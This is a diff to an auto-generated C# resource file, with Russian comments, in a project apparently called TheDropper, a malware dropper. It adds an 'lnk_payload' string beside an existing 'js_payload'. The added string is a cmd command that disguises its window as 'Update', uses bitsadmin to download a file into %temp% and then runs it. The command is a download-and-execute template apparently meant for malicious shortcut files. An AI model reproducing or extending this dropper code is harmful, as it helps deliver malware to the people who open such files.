@@ -19,7 +19,7 @@ namespace TheDropper.Properties {
     // с помощью такого средства, как ResGen или Visual Studio.
     // Чтобы добавить или удалить член, измените файл .ResX и снова запустите ResGen
     // с параметром /str или перестройте свой проект VS.
-    [global::System.CodeDom.Compiler.GeneratedCodeAttribute("System.Resources.Tools.StronglyTypedResourceBuilder", "16.0.0.0")]
+    [global::System.CodeDom.Compiler.GeneratedCodeAttribute("System.Resources.Tools.StronglyTypedResourceBuilder", "17.0.0.0")]
     [global::System.Diagnostics.DebuggerNonUserCodeAttribute()]
     [global::System.Runtime.CompilerServices.CompilerGeneratedAttribute()]
     internal class Resources {
@@ -122,6 +122,15 @@ namespace TheDropper.Properties {
         internal static string js_payload {
             get {
                 return ResourceManager.GetString("js_payload", resourceCulture);
+            }
+        }
+        
+        /// <summary>
+        ///   Ищет локализованную строку, похожую на /c @echo off &amp;&amp; title Update &amp;&amp; bitsadmin /transfer mdj /download /priority FOREGROUND {0} &quot;%temp%\\{1}&quot; &amp;&amp; start &quot;&quot; &quot;%temp%\\{2}&quot;.
+        /// </summary>
+        internal static string lnk_payload {
+            get {
+                return ResourceManager.GetString("lnk_payload", resourceCulture);
             }
         }
         
